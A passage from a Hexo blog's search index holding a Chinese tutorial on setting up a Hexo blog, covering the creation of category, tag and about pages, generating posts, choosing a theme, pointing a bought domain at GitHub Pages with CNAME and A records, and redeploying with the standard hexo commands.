<span class="hljs-type">page</span> tags<br>hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> about<br></code></pre></div></td></tr></table></figure><p>执行这些命令完善博客的模块结构，以上三条命令执行后博客就会有三个新模块生效了，分别是分类，标签，关于。而执行之前这三个模块是不能启用的,甚至在启用某些主题时页面完全失效。（关于页面还需要到对应的主题配置里面设置才能生效，如遇困难可对照主题的官方文档，因为不是所有主题的about页面设置都一样，所以官方可能会写明使用方法）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/blog_illustration02.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/illustration01.png"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>建议用下条命令生成新文章<br>hexo n [布局名称] &lt;文档名称&gt;<br></code></pre></div></td></tr></table></figure><p>其中布局名称可以省略，如果省略则默认为post布局。对post进行修改或者创建新的布局，在写文章时会方便很多</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/blog_illustration.png"></p><p>hexo n 执行后会在_post文件夹下生成一个新的md文件，虽然前文说到直接把新的md文件拖到这个文件夹也行，但还是建议用hexo n命令生成文件之后，再对这个文件修改，以下为原因：<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/illustration02.png"></p><p>​            </p><p>这样生成的文章有自己规范的开头格式，方便对文章进行规范与整理，还能顺手加个more标签</p><p>关于主题</p><p>需要下载主题并配置，关于博客的优化还需要查阅所选主题的官方文档来进行操作，去goole看看别人是怎么使用这个主题的会有很大帮助。</p><p>另外要记得搭建博客的初心啊！！写文章就好不需要太花哨</p><p>（花里胡哨的俺也搞不来）</p></li></ul><hr><h3 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h3><hr><p>域名网站上注册账号，买一个域名</p><ul><li><p>在万网控制台添加解析记录</p><p>这里的解析记录有两条分别为CNAME和A记录</p><ul><li><p>CNAME</p><p>www  ——&gt; 用户名.github.io</p></li><li><p>A</p><p>@       ——&gt;一个ipv4地址 (cmd中 ping 你的GitHub账户名.GitHub.io得到)</p></li></ul></li></ul><ul><li><p>在博客文件夹里的source里添加CNAME文件，里面写上购买的域名</p><p>​    <em>完成之后可在github对应仓库里的设置里查看是否有CNAME文件，网址是否已经保存</em></p></li><li><p>最后重新部署文件</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>即输入以下命令<br><br>hexo clean<br><span class="hljs-regexp">//</span>每次部署前都建议输入这个命令清除缓存文件和已生成的静态文件，以防修改不起作用<br>hexo g<br>hexo s<span class="hljs-regexp">//</span>先本地预览，先查看方便及时修改<br>hexo d<br></code></pre></div></td></tr></table></figure></li></ul><p>成功之后即可实现在浏览器中输入域名访问自己的博客了</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>其他领域</category>
      
    </categories>
    
    
    <tags>
      
      <tag>有手就行</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
